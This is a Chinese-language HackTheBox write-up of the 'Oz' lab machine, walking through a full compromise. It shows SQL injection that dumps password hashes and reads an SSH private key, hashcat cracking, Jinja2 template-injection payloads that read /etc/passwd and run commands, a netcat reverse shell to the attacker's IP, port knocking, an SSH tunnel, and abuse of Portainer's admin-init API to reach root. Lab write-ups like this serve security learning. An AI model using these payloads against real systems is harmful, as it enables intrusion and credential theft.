@@ -1,0 +1,572 @@
+# hackthebox Oz靶机渗透
+
+阅读量 **345122**
+
+|评论 **2**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2019-01-30 11:30:03
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p3.ssl.qhimg.com/t01c5efa684455f4120.jpg)
+
+## 信息收集：
+
+nmap -A -v -sC 10.10.10.96
+
+我们可以看到80、8080有一个werkzeug，查了一下是一个WSGI的工具包。好像还有个命令执行的漏洞，我们可以针对这个找脚本试一下
+
+    
+    
+    PORT     STATE SERVICE VERSION
+    80/tcp   open  http    Werkzeug httpd 0.14.1 (Python 2.7.14)
+    |_http-favicon: Unknown favicon MD5: C23EFC24FDC958FFC6B85B83206EBB30
+    | http-methods: 
+    |_  Supported Methods: HEAD OPTIONS GET POST
+    |_http-title: OZ webapi
+    |_http-trane-info: Problem with XML parsing of /evox/about
+    8080/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.14)
+    |_http-favicon: Unknown favicon MD5: B33CD9DDE6B54C301944D6BDECB40C5A
+    | http-methods: 
+    |_  Supported Methods: HEAD GET POST OPTIONS
+    | http-open-proxy: Potentially OPEN proxy.
+    |_Methods supported:CONNECTION
+    |_http-server-header: Werkzeug/0.14.1 Python/2.7.14
+    | http-title: GBR Support - Login
+    |_Requested resource was http://10.10.10.96:8080/login
+    |_http-trane-info: Problem with XML parsing of /evox/about
+    
+
+找到一个werkzeug-debug RCE的脚本尝试了一下，发现并没有什么用
+
+    
+    
+    # Rogerd @ kali in ~/tools [22:42:41] 
+    $ git clone https://github.com/its-arun/Werkzeug-Debug-RCE.git 
+    正克隆到 'Werkzeug-Debug-RCE'...
+    remote: Enumerating objects: 9, done.
+    remote: Total 9 (delta 0), reused 0 (delta 0), pack-reused 9
+    展开对象中: 100% (9/9), 完成.
+    # Rogerd @ kali in ~/tools [22:51:07] 
+    $ cd Werkzeug-Debug-RCE/
+    # Rogerd @ kali in ~/tools/Werkzeug-Debug-RCE on git:master o [22:53:07] 
+    $ python werkzeug.py http://10.10.10.96:8080 whoami
+    
+
+线索1：我们访问80页面，提示我们请注册一个用户，然后标题是一个Oz webapi。
+
+  
+尝试爆破一下目录,我截取了部分，可以看到基本返回的都是27B的页面。没什么有用的信息
+
+![](https://p3.ssl.qhimg.com/t016ccb8a99ed09370d.png)
+
+目录爆破没用换一个WFUZZ工具，尝试爆破一波。
+
+具体使用方法参考：<https://blog.csdn.net/hardhard123/article/details/79596104>
+
+    
+    
+    git clone https://github.com/xmendez/wfuzz.git
+    $ ./wfuzz -w wordlist/general/common.txt --hl=0  http://10.10.10.96/FUZZ
+    
+    Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+    
+    ********************************************************
+    * Wfuzz 2.3.4 - The Web Fuzzer                         *
+    ********************************************************
+    
+    Target: http://10.10.10.96/FUZZ
+    Total requests: 950
+    
+    ==================================================================
+    ID   Response   Lines      Word         Chars          Payload    
+    ==================================================================
+    
+    000871:  C=200      3 L           6 W         79 Ch      "users"
+    
+    Total time: 53.03089
+    Processed Requests: 950
+    Filtered Requests: 949
+    Requests/sec.: 17.91408
+    
+
+## SQL接口注入
+
+我们访问一下<http://10.10.10.96/users/1> ，返回null。
+
+这里很可能是一个参数我们输入admin，返回了一串json
+
+{“username”:”admin”}
+
+既然有输入点又返回，那就有可能有注入点。
+
+访问：[http://10.10.10.96/users/admin’%20or%20’1’=’1](http://10.10.10.96/users/admin'%20or%20'1'='1)
+
+返回：{“username”:”dorthi”}
+
+使用sqlmap注入，直接dump里面的内容
+
+sqlmap -u <http://10.10.10.96/users/admin> —dump
+
+    
+    
+    Database: ozdb                                                                                    
+    Table: tickets_gbw
+    [12 entries]
+    +----+----------+--------------------------------------------------------------------------------------------------------------------------------+
+    | id | name     | desc                                                                                                                           |
+    +----+----------+--------------------------------------------------------------------------------------------------------------------------------+
+    | 1  | GBR-987  | Reissued new id_rsa and id_rsa.pub keys for ssh access to dorthi.                                                              |
+    | 2  | GBR-1204 | Where did all these damn monkey's come from!?  I need to call pest control.                                                    |
+    | 3  | GBR-1205 | Note to self: Toto keeps chewing on the curtain, find one with dog repellent.                                                  |
+    | 4  | GBR-1389 | Nothing to see here... V2hhdCBkaWQgeW91IGV4cGVjdD8=                                                                            |
+    | 5  | GBR-4034 | Think of a better secret knock for the front door.  Doesn't seem that secure, a Lion got in today.                             |
+    | 6  | GBR-5012 | I bet you won't read the next entry.                                                                                           |
+    | 7  | GBR-7890 | HAHA! Made you look.                                                                                                           |
+    | 8  | GBR-7945 | Dorthi should be able to find her keys in the default folder under /home/dorthi/ on the db.                                    |
+    | 9  | GBR-8011 | Seriously though, WW91J3JlIGp1c3QgdHJ5aW5nIHRvbyBoYXJkLi4uIG5vYm9keSBoaWRlcyBhbnl0aGluZyBpbiBiYXNlNjQgYW55bW9yZS4uLiBjJ21vbi4= |
+    | 10 | GBR-8042 | You are just wasting time now... someone else is getting user.txt                                                              |
+    | 11 | GBR-8457 | Look... now they've got root.txt and you don't even have user.txt                                                              |
+    | 12 | GBR-9872 | db information loaded to ticket application for shared db access                                                               |
+    +----+----------+--------------------------------------------------------------------------------------------------------------------------------+
+    Database: ozdb
+    Table: users_gbw
+    [6 entries]
+    +----+-------------+----------------------------------------------------------------------------------------+
+    | id | username    | password                                                                               |
+    +----+-------------+----------------------------------------------------------------------------------------+
+    | 1  | dorthi      | $pbkdf2-sha256$5000$aA3h3LvXOseYk3IupVQKgQ$ogPU/XoFb.nzdCGDulkW3AeDZPbK580zeTxJnG0EJ78 |
+    | 2  | tin.man     | $pbkdf2-sha256$5000$GgNACCFkDOE8B4AwZgzBuA$IXewCMHWhf7ktju5Sw.W.ZWMyHYAJ5mpvWialENXofk |
+    | 3  | wizard.oz   | $pbkdf2-sha256$5000$BCDkXKuVMgaAEMJ4z5mzdg$GNn4Ti/hUyMgoyI7GKGJWeqlZg28RIqSqspvKQq6LWY |
+    | 4  | coward.lyon | $pbkdf2-sha256$5000$bU2JsVYqpbT2PqcUQmjN.Q$hO7DfQLTL6Nq2MeKei39Jn0ddmqly3uBxO/tbBuw4DY |
+    | 5  | toto        | $pbkdf2-sha256$5000$Zax17l1Lac25V6oVwnjPWQ$oTYQQVsuSz9kmFggpAWB0yrKsMdPjvfob9NfBq4Wtkg |
+    | 6  | admin       | $pbkdf2-sha256$5000$d47xHsP4P6eUUgoh5BzjfA$jWgyYmxDK.slJYUTsv9V9xZ3WWwcl9EBOsz.bARwGBQ |
+    +----+-------------+----------------------------------------------------------------------------------------+
+    
+
+V2hhdCBkaWQgeW91IGV4cGVjdD8=
+
+解密：What did you expect?
+
+WW91J3JlIGp1c3QgdHJ5aW5nIHRvbyBoYXJkLi4uIG5vYm9keSBoaWRlcyBhbnl0aGluZyBpbiBiYXNlNjQgYW55bW9yZS4uLiBjJ21vbi4=
+
+解密：You’re just trying too hard… nobody hides anything in base64 anymore…
+c’mon.
+
+都是没啥用的线索，只知道他说了，现在没有人会用base64加密了。
+
+![](https://p0.ssl.qhimg.com/t01a0ee6d7bfee0ece1.png)
+
+我们可以看到第8条，默认文件下可以找到密钥。
+
+直接注入读默认文件路径/home/dorthi/.ssh/id_rsa
+
+[http://10.10.10.96/users/111’%20union%20select%20all%20LOAD_FILE(0x2f686f6d652f646f727468692f2e7373682f69645f727361)–%20ss](http://10.10.10.96/users/111'%20union%20select%20all%20LOAD_FILE\(0x2f686f6d652f646f727468692f2e7373682f69645f727361\)--%20ss)
+
+    
+    
+    {"username":"-----BEGIN RSA PRIVATE KEY-----nProc-Type: 4,ENCRYPTEDnDEK-Info: AES-128-CBC,66B9F39F33BA0788CD27207BF8F2D0F6nnRV903H6V6lhKxl8dhocaEtL4Uzkyj1fqyVj3eySqkAFkkXms2H+4lfb35UZb3WFCnb6P7zYZDAnRLQjJEc/sQVXuwEzfWMa7pYF9Kv6ijIZmSDOMAPjaCjnjnX5kJMK3Fne1BrQdh0phWAhhUmbYvt2z8DD/OGKhxlC7oT/49I/ME+tm5eyLGbK69Ouxb5PBtynh9A+Tn70giENR/ExO8qY4WNQQMtiCM0tszes8+guOEKCckMivmR2qWHTCs+N7wbzna//JhOG+GdqvEhJp15pQuj/3SC9O5xyLe2mqL1TUK3WrFpQyv8lXartH1vKTnybdn9+Wme/gVTfwSZWgMeGQjRXWe3KUsgGZNFK75wYtA/F/DB7QZFwfO2Lb0mL7Xyzx6nZakulY4bFpBtXsuBJYPNy7wB5ZveRSB2f8dznu2mvarByMoCN/XgVVZujugNbEcjnevroLGNe/+ISkJWV443KyTcJ2iIRAa+BzHhrBx31kG//nix0vXoHzB8Vj3fqh+2MnEycVvDxLK8CIMzHc3cRVUMBeQ2X4GuLPGRKlUeSrmYz/sH75AR3zh6Zvlva15Yavn5vR48cdShFS3FC6aH6SQWVe9K3oHzYhwlfT+wVPfaeZrSlCH0hG1z9C1B9BxMLQrnDHejp9bbLppJ39pe1U+DBjzDo4s6rk+Ci/5dpieoeXrmGTqElDQi+KEU9g8CJptonbYAGUxPFIpPrN2+1RBbxY6YVaop5eyqtnF4ZGpJCoCW2r8BRsCvuILvrO1O0gXF+nwtsktmylmHvHApoXrW/GThjdVkdD9U/6Rmvv3s/OhtlAp3Wqw6RI+KfCPGiCzh1Vn0yfXH70CfLO2NcWtO/JUJvYH3M+rvDDHZSLqgW841ykzdrQXnR7s9Nj2EmoW72IHnznNPmB1LQtD45NH6OIG8+QWNAdQHcgZepwPz4/9pe2tEqu7Mg/cLUBsTYb4a6mftnicOX9OAOrcZ8RGcIdVWtzU4q2YKZex4lyzeC/k4TAbofZ0E4kUsaIbFV/7OMedMCnzCTJ6rlAl2d8e8dsSfF96QWevnD50yx+wbJ/izZonHmU/2ac4c8LPYq6Q9KLmlnunvI9bLfOJh8DLFuqCVI8GzROjIdxdlzk9yp4LxcAnm1Ox9MEIqmOVwAd3bEmYckKwnw/EmArNIrnr54Q7a1PMdCsZcejCjnvmQFZ3ko5CoFCC+kUe1j92i081kOAhmXqV3nc6xgh8Vg2qOyzoZm5wRZZF2nTXnnCQ3OYR3NMsUBTVG2tlgfp1NgdwIyxTWn09V0nnOzqNtJ7OBt0/RewTsFgoNVrCQbQ8VvZFckvG8sV3U9bh9Zl28/2I3B472iQRo+5nuoRHpAgfOSOERtxuMpkrkU3IzSPsVS9c3LgKhiTS5wTbTw7O/vxxNOoLpoxO2Wzbn/4XnEBh6VgLrjThQcGKigkWJaKyBHOhEtuZqDv2MFSE6zdX/N+L/FRIv1oVR9VYvnQGpqEaGSUG+/TSdcANQdD3mv6EGYI+o4rZKEHJKUlCI+I48jHbvQCLWaR/bkjZJunXtSuV0TJXto6abznSC1BFlACIqBmHdeaIXWqH+NlXOCGE8jQGM8s/fd/j5g1Adw3n-----END RSA PRIVATE KEY-----n"}
+    
+
+尝试用ssh登陆。发现无法登陆，没有ssh服务。
+
+尝试破解一下hash，先用hashid查看一下类型
+
+    
+    
+    $ hashid '$pbkdf2-sha256$5000$aA3h3LvXOseYk3IupVQKgQ$ogPU/XoFb.nzdCGDulkW3AeDZPbK580zeTxJnG0EJ78' 
+    Analyzing '$pbkdf2-sha256$5000$aA3h3LvXOseYk3IupVQKgQ$ogPU/XoFb.nzdCGDulkW3AeDZPbK580zeTxJnG0EJ78'
+    [+] PBKDF2-SHA256(Generic)
+    
+
+## hashcat爆破
+
+使用hashcat 查看
+
+先把hash修改，加入hashoz文件
+
+>
+> sha256:5000:aA3h3LvXOseYk3IupVQKgQ:ogPU/XoFb.nzdCGDulkW3AeDZPbK580zeTxJnG0EJ78  
+>
+> sha256:5000:GgNACCFkDOE8B4AwZgzBuA:IXewCMHWhf7ktju5Sw.W.ZWMyHYAJ5mpvWialENXofk  
+>
+> sha256:5000:BCDkXKuVMgaAEMJ4z5mzdg:GNn4Ti/hUyMgoyI7GKGJWeqlZg28RIqSqspvKQq6LWY  
+>
+> sha256:5000:bU2JsVYqpbT2PqcUQmjN.Q:hO7DfQLTL6Nq2MeKei39Jn0ddmqly3uBxO/tbBuw4DY  
+>
+> sha256:5000:Zax17l1Lac25V6oVwnjPWQ:oTYQQVsuSz9kmFggpAWB0yrKsMdPjvfob9NfBq4Wtkg  
+>
+> sha256:5000:d47xHsP4P6eUUgoh5BzjfA:jWgyYmxDK.slJYUTsv9V9xZ3WWwcl9EBOsz.bARwGBQ
+
+hashcat -m 10900 /home/Rogerd/tools/hashoz /home/Rogerd/tools/rockyou.txt
+
+最后跑出账号密码wizardofoz22/wizard.oz
+
+<https://hashcat.net/wiki/doku.php?id=example_hashes>
+
+当我们有账号以后，我们尝试登陆一下8080的页面
+
+![](https://p3.ssl.qhimg.com/t011072ba0c5e7ba74a.png)
+
+wizard.oz/wizardofoz22登陆成功
+
+谷歌payload all ssti
+
+<https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20injections>
+
+## SSTI模板注入
+
+然后在ticket-create，添加的时候抓包，发现一个SSTI注入
+
+![](https://p2.ssl.qhimg.com/t01b0034befe57b071c.png)
+
+可以直接读取到passwd
+
+    
+    
+    name={{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+    
+
+直接读取配置文件
+
+    
+    
+    name={{config}}
+    <Config {JSON_AS_ASCII: True
+     USE_X_SENDFILE: False
+     SQLALCHEMY_DATABASE_URI: mysql+pymysql://dorthi:N0Pl4c3L1keH0me@10.100.10.4/ozdb
+     SESSION_COOKIE_SECURE: False
+     SQLALCHEMY_TRACK_MODIFICATIONS: None
+     SQLALCHEMY_POOL_SIZE: None
+     SQLALCHEMY_POOL_TIMEOUT: None
+     SESSION_COOKIE_PATH: None
+     SQLALCHEMY_RECORD_QUERIES: None
+     SESSION_COOKIE_DOMAIN: None
+     SESSION_COOKIE_NAME: session
+     SQLALCHEMY_BINDS: None
+     SQLALCHEMY_POOL_RECYCLE: None
+     MAX_COOKIE_SIZE: 4093
+     SESSION_COOKIE_SAMESITE: None
+     PROPAGATE_EXCEPTIONS: None
+     ENV: production
+     DEBUG: False
+     SQLALCHEMY_COMMIT_ON_TEARDOWN: False
+     SECRET_KEY: None
+     EXPLAIN_TEMPLATE_LOADING: False
+     SQLALCHEMY_NATIVE_UNICODE: None
+     MAX_CONTENT_LENGTH: None
+     SQLALCHEMY_ECHO: False
+     APPLICATION_ROOT: /
+     SERVER_NAME: None
+     PREFERRED_URL_SCHEME: http
+     JSONIFY_PRETTYPRINT_REGULAR: False
+     TESTING: False
+     PERMANENT_SESSION_LIFETIME: datetime.timedelta(31)
+     TEMPLATES_AUTO_RELOAD: None
+     TRAP_BAD_REQUEST_ERRORS: None
+     JSON_SORT_KEYS: True
+     JSONIFY_MIMETYPE: application/json
+     SQLALCHEMY_MAX_OVERFLOW: None
+     SESSION_COOKIE_HTTPONLY: True
+     SEND_FILE_MAX_AGE_DEFAULT: datetime.timedelta(0
+     43200)
+     PRESERVE_CONTEXT_ON_EXCEPTION: None
+     SESSION_REFRESH_EACH_REQUEST: True
+     TRAP_HTTP_EXCEPTIONS: False}>
+    
+
+我们先通过写入配置，然后调用RUNCMD执行命令
+
+分别按顺序执行下面3条命令
+
+    
+    
+    {{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_outputnnRUNCMD = check_outputn') }} # 写如配置文件
+    {{ config.from_pyfile('/tmp/evilconfig.cfg') }}  # 加载配置文件
+    {{ config['RUNCMD']('whoami',shell=True) }} # 执行命令
+    
+
+  
+使用kali nc -nlvp 4444接收shell
+
+再通过burp弹shell
+
+    
+    
+    {{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals['linecache'].__dict__.values()[-2].popen('nc 10.10.14.2 4444 -e /bin/sh').read()}}
+    
+
+![](https://p3.ssl.qhimg.com/t011c2a2d52b7826d3b.png)
+
+我们还可以用tplmap，来执行ssti命令
+
+git clone <https://github.com/epinna/tplmap.git>  
+python tplmap.py -u ‘<http://10.10.10.96:8080>‘ -X POST -d
+‘name=*&desc=anything’ -c
+‘token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndpemFyZC5veiIsImV4cCI6MTU0NzY1MzA2MX0.YEkK6t08h6aU-e2qH5sCa0OuQ09p4ScenD7_ZgkBTGY’
+—reverse-shell 10.10.15.75 4444
+
+![](https://p0.ssl.qhimg.com/t0163b8e0c5ff61f9ce.png)
+
+查看containers/database/start.sh文件
+
+cat start.sh
+
+    
+    
+    /containers/database # cat start.sh
+    #!/bin/bash
+    
+    docker run -d -v /connect/mysql:/var/lib/mysql --name ozdb 
+    --net prodnet --ip 10.100.10.4 
+    -e MYSQL_ROOT_PASSWORD=SuP3rS3cr3tP@ss 
+    -e MYSQL_USER=dorthi 
+    -e MYSQL_PASSWORD=N0Pl4c3L1keH0me 
+    -e MYSQL_DATABASE=ozdb 
+    -v /connect/sshkeys:/home/dorthi/.ssh/:ro 
+    -v /dev/null:/root/.bash_history:ro 
+    -v /dev/null:/root/.ash_history:ro 
+    -v /dev/null:/root/.sh_history:ro 
+    --restart=always 
+    mariadb:5.5
+    
+
+在根目录ls -al看到一个文件.secret
+
+我们打开进去看/.secret/knockd.conf
+
+knockd
+主要的目的是希望可以动态的修改防火墙规则，如果在15秒内按顺序联系udp端口40809,50212和46969，则在接下来的10秒内，防火墙将在端口22上打开。
+
+    
+    
+    /.secret # cat knockd.conf
+    [options]
+        logfile = /var/log/knockd.log
+    
+    [opencloseSSH]
+    
+        sequence    = 40809:udp,50212:udp,46969:udp
+        seq_timeout    = 15
+        start_command    = ufw allow from %IP% to any port 22
+        cmd_timeout    = 10
+        stop_command    = ufw delete allow from %IP% to any port 22
+        tcpflags    = syn
+    
+
+写一个bash脚本，在15秒内按顺序执行。然后ssh端口打开后，直接用密钥链接。
+
+然后直接输入密码N0Pl4c3L1keH0me 登陆成功
+
+    
+    
+    #!/bin/bash
+    
+    ports="40809 50212 46969"
+    
+    for port in $ports; do 
+    
+        echo "[*] Knocking on ${port}"
+        echo "a" | nc -u -w 1 10.10.10.96 ${port}
+        sleep 0.1
+    done; 
+    
+    echo "[*] Knocking done."
+    echo "[*] Password:"
+    echo "N0Pl4c3L1keH0me"
+    
+    ssh -i ~/id_rsa dorthi@10.10.10.96
+    
+
+## docker
+
+这时候查看一下根目录，发现user.txt
+
+然后看一下sudo -l 显示出自己（执行 sudo 的使用者）的权限
+
+![](https://p3.ssl.qhimg.com/t0105c944189ec17eda.png)
+
+我们可以运行两条docker命令
+
+/usr/bin/docker network inspect *
+
+/usr/bin/docker network ls
+
+查看docker网络
+
+sudo /usr/bin/docker network ls
+
+我们可以看到两个桥接网络 bridge
+
+网桥网络是一种可用于将某些docker主机与其他docker主机隔离的网络。从[docker](https://docs.docker.com/network/bridge/)文档：
+
+就Docker而言，桥接网络使用软件桥接器，该软件桥接器允许连接到同一桥接网络的容器进行通信，同时提供与未连接到该桥接网络的容器的隔离。Docker桥驱动程序会自动在主机中安装规则，以便不同网桥上的容器无法直接相互通信。
+
+    
+    
+    NETWORK ID          NAME                DRIVER              SCOPE
+    2572cd5f4853        bridge              bridge              local
+    49c1b0c16723        host                host                local
+    3ccc2aa17acf        none                null                local
+    48148eb6a512        prodnet             bridge              local
+    
+
+查看桥接的网络
+
+sudo /usr/bin/docker network inspect bridge
+
+172.17.0.2为Portainer实例，用于管理docker的UI
+
+Portainer:<https://github.com/portainer/portainer>
+
+    
+    
+    dorthi@Oz:~$ sudo /usr/bin/docker network inspect bridge
+    [
+        {
+            "Name": "bridge",
+            "Id": "2572cd5f48539146fdbdffb021b995b4b2f62495be9c666efeb73eb88d2ef237",
+            "Created": "2019-01-16T16:40:46.870486827-06:00",
+            "Scope": "local",
+            "Driver": "bridge",
+            "EnableIPv6": false,
+            "IPAM": {
+                "Driver": "default",
+                "Options": null,
+                "Config": [
+                    {
+                        "Subnet": "172.17.0.0/16",
+                        "Gateway": "172.17.0.1"
+                    }
+                ]
+            },
+            "Internal": false,
+            "Attachable": false,
+            "Containers": {
+                "e267fc4f305575070b1166baf802877cb9d7c7c5d7711d14bfc2604993b77e14": {
+                    "Name": "portainer-1.11.1",
+                    "EndpointID": "fd4a166294c888d423f971bfa3e58e6bb15adcfa5542f524c15543abd0de3d36",
+                    "MacAddress": "02:42:ac:11:00:02",
+                    "IPv4Address": "172.17.0.2/16",
+                    "IPv6Address": ""
+                }
+            },
+            "Options": {
+                "com.docker.network.bridge.default_bridge": "true",
+                "com.docker.network.bridge.enable_icc": "true",
+                "com.docker.network.bridge.enable_ip_masquerade": "true",
+                "com.docker.network.bridge.host_binding_ipv4": "0.0.0.0",
+                "com.docker.network.bridge.name": "docker0",
+                "com.docker.network.driver.mtu": "1500"
+            },
+            "Labels": {}
+        }
+    ]
+    
+
+通过查看Portainer文档，默认端口是9000
+
+我们使用curl访问一下看，发现是存在的。
+
+    
+    
+    dorthi@Oz:~$ curl http://172.17.0.2:9000/
+    <!DOCTYPE html>
+    <html lang="en" ng-app="portainer">
+    <head>
+      <meta charset="utf-8">
+      <title>Portainer</title>
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <meta name="description" content="">
+      <meta name="author" content="Portainer.io">
+    
+      <link rel="stylesheet" href="css/app.4eebaa14.css">
+    
+
+由于kali无法直接访问172.17.0.2:9000
+
+所以我们在靶机上执行反向代理操作。
+
+然后就可以在kali实现访问172.17.0.2了
+
+ssh -C -f -N -g -R 10.10.10.96:1234:172.17.0.2:9000
+[Rogerd@10.10.15](mailto:Rogerd@10.10.15).75 -p 22
+
+![](https://p0.ssl.qhimg.com/t0195d3dfef18fc689d.png)
+
+portainer API存在一个未授权访问的漏洞
+
+我们看到上图是一个登陆界面，查找一下portainer api里面其中有一条初始化管理员账号密码的API
+
+    
+    
+    http POST :9000/api/users/admin/init Username="admin" Password="admin"
+    
+
+我们尝试执行这个API
+
+    
+    
+    dorthi@Oz:~$ http POST 172.17.0.2:9000/api/users/admin/init Username="admin" Password="admin"
+    HTTP/1.1 200 OK
+    Content-Length: 0
+    Content-Type: text/plain; charset=utf-8
+    Date: Thu, 17 Jan 2019 08:33:17 GMT
+    
+
+重置成功，使用admin/admin登陆
+
+我们点击containers->add containers
+
+然后填写相关的配置
+
+![](https://p1.ssl.qhimg.com/t0188e393fc502c7182.png)
+
+![](https://p2.ssl.qhimg.com/t01574c79f1bb5ffb3e.png)
+
+点开test,找到console，选择/bin/sh,执行一下命令，拿到root.txt
+
+![](https://p3.ssl.qhimg.com/t01d537693ce839fa86.png)
+
+## 参考
+
+<https://forum.hackthebox.eu/discussion/1042/oz>
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **rogerd** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/170362](/post/id/170362)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [渗透测试](/tag/渗透测试)
+  * [靶机](/tag/靶机)
+
+ **+1** __0赞
+
+ __收藏
+
+![](https://p1.ssl.qhimg.com/t01f59f68d65ed6d064.png) rogerd
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
